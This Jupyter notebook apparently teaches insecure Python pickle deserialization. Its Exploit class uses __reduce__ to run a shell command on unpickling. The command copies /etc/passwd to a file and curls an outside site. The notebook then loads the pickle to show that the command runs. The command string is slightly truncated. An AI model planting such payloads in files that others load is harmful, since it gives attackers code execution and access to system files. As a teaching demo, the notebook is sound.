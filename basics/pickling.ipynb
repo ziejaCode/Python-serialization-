{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9-final"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3",
   "language": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "# this will present how using pickling\n",
    "\n",
    "import os\n",
    "import pickle\n",
    "\n",
    "class Exploit():\n",
    "    def __reduce__(self):\n",
    "        return (os.system, ('cat /etc/passwd > exploit.txt && curl www.wp.pl >> exploit.', ))\n",
    "\n",
    "def serialize_exploit(fname):\n",
    "    with open(fname, 'wb') as f:\n",
    "        pickle.dump(Exploit(), f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "serialize_exploit('loadme')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "metadata": {},
     "execution_count": 31
    }
   ],
   "source": [
    "# now unpickling \n",
    "\n",
    "pickle.load(open('loadme','rb'))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ]
}